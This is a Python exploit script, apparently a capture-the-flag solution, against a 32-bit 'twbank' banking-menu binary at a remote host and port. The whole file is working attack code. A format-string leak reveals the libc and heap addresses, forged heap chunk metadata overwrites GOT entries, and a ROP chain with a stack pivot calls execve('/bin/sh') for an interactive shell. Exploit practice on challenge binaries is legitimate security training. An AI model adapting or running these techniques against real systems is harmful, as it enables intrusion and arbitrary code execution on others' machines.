#!/usr/bin/env python
from sc_expwn import *

bin_file = './twbank'
context(os = 'linux', arch = 'i386')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'env':{'LD_LIBRARY_PATH':'./libc'}}, \
                        local   = {'argv':[bin_file], 'env':{'LD_LIBRARY_PATH':'./libc'}}, \
                        #remote   = {'host':'localhost', 'port':8080})
                        remote  = {'host':'10.17.125.202', 'port':35187})
env.select('remote')

#==========

binf = ELF(bin_file)
addr_plt_read       = binf.plt['read']
addr_got_main       = binf.got['libc_start_main']
addr_latest         = binf.symbols['latest']
addr_bss            = binf.sep_section['.bss']
addr_getint         = binf.sep_function['getint']

libc = ELF('./libc/libtinyc.so')
offset_libc_main    = libc.sep_function['libc_start_main']

str_sh              = '/bin/sh\x00'

#==========

def attack(conn):
    bank = Bank(conn)

    exploit  = p32(addr_got_main)
    exploit += p32(addr_latest + 0x8)
    conn.recvuntil('name : ')
    conn.sendline(exploit)

    bank.deposit(0x30000000, 4, 'AAAA')

    bank.transfer(0x10, '%d '*0x8 + '%s '*0x2)
    leak = bank.show().split(' ')

    addr_libc_main = u32(leak[10][:4])
    libc.address = addr_libc_main - offset_libc_main
    info('addr_libc_base   = 0x{:08x}'.format(libc.address))
    addr_libc_got           = libc.sep_section['.got.plt']
    addr_libc_data          = libc.sep_section['.data']
    addr_libc__read         = libc.address + 0x000014b5 # libc.sep_function['_read']
    addr_libc_arg2reg       = libc.address + 0x00001553 # libc.sep_function['__arg2reg']

    addr_heap_base = u32(leak[11][:4]) - 0xb0
    info('addr_heap_base   = 0x{:08x}'.format(addr_heap_base))
    if not addr_heap_base & 0x80000000:
        return False

    bank.deposit(0x30000000, 0x400, 'B'*0x200)

    exploit  = '\x11'*0xcb
    exploit += p32(((addr_libc_data + 0x1c) - (addr_heap_base + 0x288)) | 1)   # PREV_INUSE
    exploit += p32(addr_heap_base + 0x288)
    exploit += p32(addr_heap_base + 0x288)
    exploit += '\x22'*(0x180-0x44-len(exploit))
    bank.deposit(0x40000000, 0x180, exploit)

    bank.show()

    bank.deposit(0 , 0x10, 'D')
    exploit  = '\x33'*0x3
    exploit += p32(addr_libc__read)
    exploit += '\x44'*0x4
    exploit += p32(addr_getint + 0x9)
    bank.deposit(0 , (addr_libc_got + 4) - (addr_heap_base + 0x04) - 1 , exploit)

    rop = ROP(libc)
    rop.raw(rop.ebp)
    rop.raw(addr_bss+0x10)      # anyware writable
    rop.read(constants.STDIN_FILENO, addr_bss+0x100, 0x100)
    rop.raw(rop.ebp)
    rop.raw(addr_bss+0x100)
    rop.raw(rop.leave)          # stack pivot
    conn.send('\x55'*0x10+str(rop))

    rop = ROP(libc)
    rop.read(constants.STDIN_FILENO, addr_bss+0x10, constants.SYS_execve)   # anyware writable
    rop.raw(rop.ebp)
    rop.raw(addr_bss + 0x130 - 8)
    rop.call(addr_libc_arg2reg)
    rop.raw(rop.int80.details)

    payload  = p32(0xdeadbeef)
    payload += str(rop)
    payload += '\x66'*(0x30-len(payload))
    payload += p32(addr_bss + 0x13c) # addr_bss + 0x130
    payload += p32(0)
    payload += p32(0)
    payload += str_sh
    sleep(0.5)
    conn.send(payload)

    sleep(0.5)
    conn.send('a'*constants.SYS_execve)

    return True
    
class Bank:
    def __init__(self, conn):
        self.recvuntil  = conn.recvuntil
        self.recv       = conn.recv
        self.sendline   = conn.sendline
        self.send       = conn.send

    def deposit(self, amount, size, comment):
        self.recvuntil('> ')
        self.sendline('1')
        self.recvuntil('amount : ')
        self.sendline(str(amount))
        self.recvuntil('size : ')
        self.sendline(str(size))
        self.recvuntil('comment : ')
        self.send(comment)

    def withdraw(self, amount, size, comment):
        self.recvuntil('> ')
        self.sendline('2')
        self.recvuntil('amount : ')
        self.sendline(str(amount))
        self.recvuntil('size : ')
        self.sendline(str(size))
        self.recvuntil('comment : ')
        self.send(comment)

    def transfer(self, amount, dest):
        self.recvuntil('> ')
        self.sendline('3')
        self.recvuntil('amount : ')
        self.sendline(str(amount))
        self.recvuntil('Destination : ')
        self.send(dest)

    def show(self):
        self.recvuntil('> ')
        self.sendline('4')
        self.recvuntil('comment : ')
        return self.recvuntil('\n')

#==========

if __name__=='__main__':
    while True:
        conn = communicate(env.mode, **env.target)
        if attack(conn):
            break
        conn.close()
    conn.interactive()
    
#==========
